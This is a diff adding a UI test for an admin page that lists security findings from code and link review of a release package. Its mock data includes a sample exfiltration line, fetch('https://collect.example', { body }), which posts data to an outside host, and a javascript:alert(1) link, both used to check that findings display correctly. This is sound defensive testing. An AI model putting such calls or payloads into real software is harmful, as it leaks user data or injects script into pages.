@@ -277,6 +277,96 @@ describe("emailing a publisher about code findings", () => {
 	});
 });
 
+describe("assessment findings", () => {
+	it("shows who raised each finding, the cited code and the flagged link", async () => {
+		window.history.replaceState(null, "", "/_admin/assessments");
+		const item = assessment("gallery-release", "review");
+		api.getAssessments.mockResolvedValue({ items: [item] });
+		api.getAssessment.mockResolvedValue({
+			assessment: {
+				...item,
+				canonicalInput: {
+					input: { name: "Gallery", slug: "gallery" },
+					text: [{ ref: "profile.name", value: "Gallery", format: "plain" }],
+					links: [
+						{ ref: "profile.sections.faq.links[0]", url: "javascript:alert(1)", usage: "markdown" },
+					],
+				},
+				summary: {
+					reasonCodes: ["policy-finding"],
+					codeReviews: [
+						{
+							model: "anthropic/claude-opus-5-5",
+							promptVersion: "v1",
+							summary: "Posts leave the site.",
+							findingCount: 1,
+						},
+						{
+							model: "openai/gpt-6.1-sol",
+							promptVersion: "v1",
+							summary: "Flagged for possible biological risk.",
+							findingCount: 0,
+							declined: true,
+						},
+					],
+				},
+			},
+			findings: [
+				{
+					finding_index: 0,
+					category: "malicious-code",
+					confidence: 0.9,
+					reason_code: "policy-finding",
+					public_summary: "Sends every published post to an undeclared host.",
+					evidenceRefs: ["release.package:backend.js#L2"],
+					severity: "critical",
+					source: "anthropic/claude-opus-5-5",
+					excerpts: [
+						{
+							ref: "release.package:backend.js#L2",
+							startLine: 1,
+							lines: ["export default {", "  fetch('https://collect.example', { body })", "};"],
+						},
+					],
+					created_at: "2026-08-27T10:00:00.000Z",
+				},
+				{
+					finding_index: 1,
+					category: "malicious-or-deceptive-link",
+					confidence: 1,
+					reason_code: "policy-finding",
+					public_summary: "Displayed link failed the link check: unsupported-scheme.",
+					evidenceRefs: ["profile.sections.faq.links[0]"],
+					severity: null,
+					source: "link-check",
+					created_at: "2026-08-27T10:00:00.000Z",
+				},
+			],
+			manualDecision: null,
+		});
+
+		render(
+			<I18nProvider i18n={i18n}>
+				<Toasty>
+					<App />
+				</Toasty>
+			</I18nProvider>,
+		);
+
+		expect(await screen.findByText("Posts leave the site.")).toBeTruthy();
+		expect(screen.getByText("Declined to review")).toBeTruthy();
+		expect(screen.getByText("Malicious code")).toBeTruthy();
+		expect(screen.getByText("Critical")).toBeTruthy();
+		expect(screen.getByText("anthropic/claude-opus-5-5 · 90% confidence")).toBeTruthy();
+		expect(screen.getByText("backend.js:2")).toBeTruthy();
+		expect(
+			screen.getByText("fetch('https://collect.example', { body })", { exact: false }),
+		).toBeTruthy();
+		expect(screen.getByText("javascript:alert(1)")).toBeTruthy();
+		expect(screen.getByText("link-check · 100% confidence")).toBeTruthy();
+	});
+});
+
 function assessment(runKey: string, state: "review" | "error") {
 	return {
 		run_key: runKey,
